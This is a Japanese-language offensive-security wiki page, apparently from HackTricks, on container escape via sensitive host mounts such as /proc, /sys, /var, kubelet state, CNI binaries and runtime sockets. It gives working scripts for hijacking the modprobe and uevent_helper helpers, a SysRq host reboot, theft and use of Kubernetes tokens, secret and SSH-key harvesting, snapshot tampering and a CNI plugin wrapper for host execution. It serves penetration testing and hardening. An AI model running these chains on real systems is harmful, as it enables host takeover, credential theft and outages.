# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 概要

Host mounts は、慎重に分離されたプロセスビューを host リソースの直接的な可視性へと戻してしまうことが多いため、最も重要な実践的 container-escape 攻撃面の一つです。危険なケースは `/` に限られません。`/proc`、`/sys`、`/var`、runtime socket、kubelet が管理する state、または device 関連の path の bind mount によって、kernel control、credential、隣接する container filesystem、runtime management interface が露出する可能性があります。

このページが個別の protection ページとは別に存在するのは、abuse model が横断的だからです。writable な host mount が危険なのは、mount namespace、user namespace、AppArmor または SELinux の coverage、そして露出した正確な host path の一部が原因です。これを独立した topic として扱うことで、attack surface をより簡単に把握できます。

## `/proc` Exposure

procfs には、通常の process information と high-impact な kernel control interface の両方が含まれています。そのため、`-v /proc:/host/proc` のような bind mount や、予期しない writable な proc entry を露出する container view によって、information disclosure、denial of service、または host での直接的な code execution につながる可能性があります。

High-value な procfs path には、以下が含まれます。

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` （特に `register` と `status`）
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

まず、どの high-value な procfs entry が可視または writable なのかを確認します。
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
これらのパスが興味深い理由はそれぞれ異なります。`core_pattern`、`modprobe`、`binfmt_misc` は、書き込み可能な場合に host code-execution の経路になり得ます。`kallsyms`、`kmsg`、`kcore`、`config.gz` は、kernel exploitation における強力な reconnaissance の情報源です。`sched_debug` と `mountinfo` は、プロセス、cgroup、filesystem のコンテキストを明らかにし、container 内部から host の構成を再構築するのに役立ちます。

各パスの実用的な価値は異なります。すべてが同じ影響を持つかのように扱うと、triage が難しくなります。

- `/proc/sys/kernel/core_pattern`
書き込み可能な場合、これは最も影響の大きい procfs パスの一つです。kernel は crash 後に pipe handler を実行するためです。container から `core_pattern` を、overlay または mount された host path 内に保存された payload に向けられる場合、host code execution を取得できることがあります。専用の例については、[read-only-paths.md](protections/read-only-paths.md) も参照してください。
- `/proc/sys/kernel/modprobe`
このパスは、kernel が module-loading logic を呼び出す必要がある場合に使用する userspace helper を制御します。container から書き込み可能で、host context で解釈される場合、別の host code-execution primitive になり得ます。helper path を trigger する方法と組み合わせられる場合に、特に興味深いパスです。
- `/proc/sys/vm/panic_on_oom`
通常、これは直接的な escape primitive ではありません。しかし、OOM condition を kernel panic behavior に変換することで、memory pressure を host-wide denial of service に変える可能性があります。
- `/proc/sys/fs/binfmt_misc`
registration interface が書き込み可能な場合、attacker は指定した magic value の handler を登録し、一致する file が実行されたときに host-context execution を取得できる可能性があります。
- `/proc/config.gz`
kernel exploit の triage に役立ちます。host の package metadata を必要とせずに、どの subsystem、mitigation、optional kernel feature が有効になっているかを判断できます。
- `/proc/sysrq-trigger`
主に denial-of-service のパスですが、非常に深刻なものです。host を即座に reboot、panic、またはその他の方法で disruption させる可能性があります。
- `/proc/kmsg`
kernel ring buffer の message を明らかにします。host fingerprinting、crash analysis、また一部の環境では kernel exploitation に役立つ情報の leak に利用できます。
- `/proc/kallsyms`
readable であれば、export された kernel symbol の情報を公開するため価値があります。また、kernel exploit の開発時に address randomization の前提を破るのに役立つ可能性があります。
- `/proc/[pid]/mem`
これは直接的な process-memory interface です。target process に必要な ptrace-style condition でアクセスできる場合、別の process の memory を読み取ったり変更したりできる可能性があります。現実的な影響は credentials、`hidepid`、Yama、ptrace restriction に大きく左右されるため、強力ですが条件付きのパスです。
- `/proc/kcore`
system memory を core-image-style に参照する view を公開します。file は非常に巨大で扱いにくいものの、意味のある形で readable であれば、host memory surface が深刻に露出していることを示します。
- `/dev/kmem` と `/dev/mem`
これらは歴史的に影響の大きい raw-memory **device** interface であり、procfs file ではありません。多くの modern system では存在しないか、厳しく制限されています。しかし、container から host-mounted copy を open できる場合は、その露出を critical と扱うべきです。存在しない `/proc/kmem` や `/proc/mem` のパスを検索するのではなく、他の sensitive `/dev` mount と併せて確認してください。
- `/proc/sched_debug`
scheduling および task の情報を leak します。これにより、他の process view が想定より整理されて見える場合でも、host process identity が露出する可能性があります。
- `/proc/[pid]/mountinfo`
container が host 上のどこに実際に存在するか、どの path が overlay-backed か、また writable mount が host content に対応しているのか、それとも container layer のみに対応しているのかを再構築するうえで、非常に役立ちます。

`/proc/[pid]/mountinfo` または overlay の詳細が readable であれば、それらを使用して container filesystem の host path を復元します。
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
これらのコマンドが有用なのは、複数の host-execution tricks で、container 内のパスを host から見た対応するパスに変換する必要があるためです。

### 例: `modprobe` Helper Path の準備

`/proc/sys/kernel/modprobe` が container から writable で、helper path が host context で解釈される場合、attacker-controlled payload へリダイレクトできます。overlay upper directory は host から解決できなければならず、container が host の `/tmp` も mount していない場合、proof output は同じ host-visible container layer に書き戻す必要があります。
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
正確な trigger は対象と kernel の挙動によって異なるため、意図的に推測していません。lab を離れる前に、元の値へ復元してください。重要なのは、書き込み可能な helper path によって、将来の kernel helper invocation を attacker-controlled な host-path content へリダイレクトできる点です。overlay の `upperdir` がない場合、host が解決できない path、read-only の sysctl mount、または選択した helper を kernel が一度も invocation しない場合、この chain は成立しません。

### 完全な例: `kallsyms`、`kmsg`、`config.gz` を使用した Kernel Recon

目的が immediate escape ではなく exploitability assessment の場合:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
これらのコマンドは、有用な symbol 情報が確認できるか、最近の kernel メッセージから興味深い状態が明らかになるか、そしてどの kernel 機能や mitigation が compile されているかを判断するのに役立ちます。通常、影響は直接的な escape ではありませんが、kernel vulnerability triage にかかる時間を大幅に短縮できます。

### Full Example: SysRq Host Reboot

`/proc/sysrq-trigger` が writable で、host の view に到達できる場合:
```bash
echo b > /proc/sysrq-trigger
```
効果は直ちにホストの再起動として現れます。これは subtle な例ではありませんが、procfs の露出が単なる情報開示よりもはるかに深刻な問題になり得ることを明確に示しています。

## `/sys` Exposure

sysfs は、kernel およびデバイスの状態を大量に公開します。一部の sysfs パスは主に fingerprinting に役立ちますが、その他のパスは helper の実行、デバイスの動作、security-module の設定、または firmware の状態に影響を与える可能性があります。

High-value な sysfs パスには、次のものがあります。

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

これらのパスが重要となる理由はそれぞれ異なります。`/sys/class/thermal` は thermal-management の動作に影響を与える可能性があり、露出が不適切な環境ではホストの安定性に影響します。`/sys/kernel/vmcoreinfo` は crash-dump および kernel-layout の情報を leak する可能性があり、低レベルのホスト fingerprinting に役立ちます。`/sys/kernel/security` は Linux Security Modules が使用する `securityfs` インターフェースであるため、予期しないアクセスによって MAC 関連の状態が露出または変更される可能性があります。EFI variable のパスは firmware によって保持される boot 設定に影響を与える可能性があり、通常の configuration file よりもはるかに深刻です。`/sys/kernel/debug` 配下の `debugfs` は、developer 向けに意図されたインターフェースであり、production 向けに harden された kernel API よりも安全性への期待がはるかに低いため、特に危険です。

このリストにあるすべての sysfs entry は、**kernel、configuration、および hardware に依存します**。現在の virtualized node では、`uevent_helper`、EFI variable、thermal-device entry が完全に省略されていることがよくあります。存在しないパスは、別の kernel の例が適用されると仮定せず、前提条件を満たさないことを示すものとして記録してください。

これらのパスの review に役立つ command は次のとおりです。
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
これらのコマンドが興味深い理由：

- `/sys/kernel/security` によって、AppArmor、SELinux、または別の LSM surface が、本来は host 専用であるべき形で見えているかどうかが明らかになる場合があります。
- `/sys/kernel/debug` は、このグループで最も警戒すべき finding であることが多くあります。`debugfs` が mount 済みで read または write 可能な場合、kernel に対する広範な surface が存在すると考えられます。正確な risk は、有効になっている debug node によって異なります。
- EFI variable の exposure はあまり一般的ではありませんが、通常の runtime file ではなく firmware-backed setting に触れるため、存在する場合の impact は大きくなります。
- `/sys/class/thermal` は、整然とした shell-style escape ではなく、主に host の stability と hardware interaction に関係します。
- `/sys/kernel/vmcoreinfo` は、主に host fingerprinting と crash-analysis の source であり、low-level な kernel state の理解に役立ちます。

### Full Example: `uevent_helper`

`/sys/kernel/uevent_helper` は kernel と configuration に依存し、現在の多くの system には存在しません。存在し、writable で、利用可能な `uevent` trigger がある場合、kernel が attacker-controlled helper を execute する可能性があります。Proof output では、host と container の両方の view から見える path を使用する必要があります：
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
この仕組みが機能する理由は、helper のパスが host の視点から解釈されるためです。トリガーされると、helper は現在の container 内ではなく、host のコンテキストで実行されます。`/sys/class/mem/null/uevent` は、それを公開している kernel における具体的なトリガーの一例です。ほかのデバイスが独自の `uevent` ファイルを公開している場合もありますが、実際の hardware 上で無作為に選択してはいけません。lab を離れる前に、元の値へ戻してください。helper ファイルまたは制御可能なトリガーが存在しない場合は、この technique が利用可能だと報告しないでください。

## `/var` Exposure

host の `/var` を container に mount することは、`/` を mount するほど劇的には見えないため、過小評価されがちです。実際には、runtime socket、container の snapshot directory、kubelet が管理する pod volume、projected service-account token、隣接する application filesystem にアクセスするには十分な場合があります。現代の node では、実際に最も運用上重要な container state が存在する場所は、多くの場合 `/var` です。

### Kubernetes の例

`hostPath: /var` を持つ pod は、他の pod の projected token と overlay snapshot の内容を読み取れることがあります：
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
これらのコマンドが有用なのは、マウントが単なるアプリケーションデータだけを公開しているのか、それとも影響の大きいクラスタ認証情報まで公開しているのかを確認できるためです。読み取り可能な service-account token があれば、ローカルコード実行が直ちに Kubernetes API へのアクセスへと変わる可能性があります。

token が存在する場合は、token の発見で止めず、到達可能な範囲を検証します：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
ここでの影響は、ローカルノードへのアクセスをはるかに超える可能性があります。広範な RBAC 権限を持つ token によって、マウントされた `/var` が cluster-wide compromise につながる可能性があります。

### Docker と containerd の例

Docker host では、関連するデータは多くの場合 `/var/lib/docker` 配下にあります。一方、containerd-backed Kubernetes node では、`/var/lib/containerd` 配下や snapshotter 固有の path にある場合があります：
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
マウントされた `/var` に別の workload の書き込み可能な snapshot 内容が公開されている場合、攻撃者は現在の container configuration に触れることなく、アプリケーションファイルを改変したり、web content を配置したり、startup script を変更したりできる可能性があります。

**使い捨ての lab workload** では、書き込み可能な snapshot 内容によって、アプリケーションの tampering、secret の回収、または lateral movement を実証できます。まず runtime container ID を正確な snapshot に対応付け、無関係な snapshot や production snapshot は決して編集しないでください。
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
これらのコマンドが有用なのは、マウントされた `/var` による主な3つの影響群、すなわち application tampering、secret recovery、neighboring workloads への lateral movement を示すためです。

直接的な snapshot writes は runtime の通常の state management を迂回するため、container を破損させたり、evidence を破壊したりする可能性があります。read-only discovery は、Docker の `overlay2` に対してローカルで再現されています。隣接する disposable container に書き込まれた marker は、`/var/lib/docker/overlay2/<id>/diff/` の下に現れました。実際の snapshot modification は、そのテスト用に作成した disposable container に限定してください。

## Kubelet State、Plugins、CNI Paths

`/var/lib/kubelet`、`/opt/cni/bin`、または `/etc/cni/net.d` の mount は、privileged DaemonSets、CNI agents、CSI node plugins、GPU operators、storage helpers を通じて公開されることがよくあります。これらの mount は「node plumbing」として軽視されがちですが、新しい pods の execution path に直接位置しており、kubelet credentials、projected secrets、registration sockets、実行可能な host-side plugin binaries が含まれていることがよくあります。

価値の高い targets には、次のものがあります。

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands は次のとおりです。
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
これらのパスが重要な理由：

- `/var/lib/kubelet/pki` には kubelet client certificates やその他の node-local credentials が含まれている可能性があり、cluster design によっては API server や kubelet-facing TLS endpoints に対して再利用できる場合があります。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` には、同じ node 上の隣接する pods 用に projected service-account tokens や mounted Secrets が含まれていることがよくあります。
- `/var/lib/kubelet/pod-resources/kubelet.sock` は主に reconnaissance surface ですが、非常に有用です。現在どの pods や containers が GPUs、hugepages、SR-IOV devices、その他の node-local resources を使用しているかが明らかになります。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins`、`/var/lib/kubelet/plugins_registry` から、どの CSI、DRA、device plugins がインストールされているか、また kubelet が通信することを想定されている sockets が明らかになります。これらの directories が単なる read-only ではなく writable である場合、finding ははるかに深刻になります。<sup>[[1]](#references)</sup>
- `/opt/cni/bin` と `/etc/cni/net.d` は pod-network setup path 上に直接位置しています。ここへの writable access は、単なる configuration exposure ではなく、遅延型の host-execution primitive になることがよくあります。<sup>[[2]](#references)</sup>

### 完全な例：Writable `/opt/cni/bin`

Host CNI binary directory が read-write で mount されている場合、plugin を置き換えるだけで、その node 上で kubelet が次に pod sandbox を作成した際に host execution を取得できる可能性があります。<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
これはマウントされた `docker.sock` ほど即時的ではありませんが、侵害された Kubernetes infrastructure pods では、より現実的なケースがよくあります。marker はマウントされた plugin の隣に書き込まれるため、host-root や host-`/tmp` の mount がなくても、container はそれを取得できます。wrapper は元の引数と標準入力を保持し、その後、example では元の binary を復元します。重要なのは、変更された binary が現在の container ではなく、後で host の network setup flow によって実行される点です。無効な wrapper によって新しい Pod sandboxes に networking が割り当てられなくなる可能性があるため、使い捨て可能な node のみを使用してください。

## Runtime Sockets

Sensitive host mounts には、完全な directory ではなく runtime sockets が含まれることがよくあります。これらは非常に重要であるため、ここで明示的に繰り返す価値があります：
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
これらのソケットのいずれかが mount された後の完全な exploitation flow については、[runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) を参照してください。

最初の簡単な interaction pattern として：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
これらのいずれかに成功すると、「mounted socket」から「より高い権限を持つ sibling container の起動」までの経路は、通常、kernel breakout の経路よりもはるかに短くなります。

## Writable Host Path Task Hijack

Writable host mount は、危険になるために `/` を公開する必要はありません。マウントされたパスに、後で host-side の scheduled task や service が使用する scripts、config files、hooks、plugins、または files が含まれている場合、container は host が実行する内容を変更できる可能性があります。

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
ホストプロセスが書き込み可能なファイルを読み込む場合、テスト中はpayloadをシンプルで観測可能なものに保つ：
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
興味深い点は trust boundary です。write は container 内部から行われますが、execution は後で host service context で実行されます。これにより、狭い hostPath または bind mount が、遅延型の host-code-execution primitive に変わります。

## Mount-Related CVEs

Host mounts は runtime vulnerabilities とも関連します。特に重要な最近の例は次のとおりです。

- `CVE-2024-21626` in `runc`: 漏洩した directory file descriptor により、working directory を host filesystem 上に配置できました。
- `CVE-2024-23651`、`CVE-2024-23652`、`CVE-2024-23653` in BuildKit: malicious Dockerfiles、frontends、`RUN --mount` flows により、build 中に host file access、deletion、または elevated privileges が再び可能になる場合がありました。
- `CVE-2024-1753` in Buildah and Podman build flows: build 中に細工された bind mounts により、`/` を read-write で公開できました。
- `CVE-2025-47290` in `containerd` 2.1.0: image unpack 中の TOCTOU により、特別に細工された image が pull 中に host filesystem を変更できました。

これらの CVEs がここで重要なのは、mount handling が operator configuration だけの問題ではないことを示しているためです。runtime 自体が、mount に起因する escape conditions を引き起こす可能性もあります。

## Checks

次の commands を使用して、最も価値の高い mount exposures をすばやく特定します：
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
ここで興味深い点:

- Host root、`/proc`、`/sys`、`/var`、runtime sockets は、いずれも優先度の高い findings です。
- Writable な proc/sys エントリは、多くの場合、その mount が安全な container view ではなく、host-global な kernel controls を公開していることを意味します。
- Mounted `/var` paths は、単なる filesystem review ではなく、credential と neighboring workload の review に値します。
- Kubelet state directories と CNI/plugin paths は、runtime sockets と同じ優先度で扱う必要があります。これらは多くの場合、node の pod-creation および credential-distribution path に直接存在するためです。

## Local Validation Status

このページの実践的な chain は、local Linux minikube node に対して検証されました。検証では、以下を再現しました:

- temporary writable hostPath を介した read および write access
- `/var/lib/kubelet/pods` を介した projected ServiceAccount tokens と mounted Secrets の discovery
- mounted kubelet state から recovered した live token による、成功した Kubernetes API authentication
- mounted `/var` を介した neighboring Docker `overlay2` filesystem の read-only discovery
- mounted `docker.sock` を介した、read-only host bind を持つ sibling container の Docker API creation
- temporary host-consumed hook を介した delayed host execution
- original plugin の arguments、standard input、execution を保持する CNI-wrapper simulation

同じ node では `core_pattern`、`modprobe`、`binfmt_misc/register`、`kallsyms`、`kcore`、`config.gz` が公開されていましたが、`uevent_helper`、EFI variables、thermal entries、`sched_debug` は公開されていませんでした。Destructive kernel triggers は実行していません。これは、host-root、`/var`、kubelet-state、socket、host-consumer chains が再現可能である一方、procfs/sysfs helper techniques は、正確な kernel、mount mode、payload path、trigger に依存するため、conditional のままにする必要があることを確認しています。

## References

- [1] [Kubelet が使用するローカルファイルとパス](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
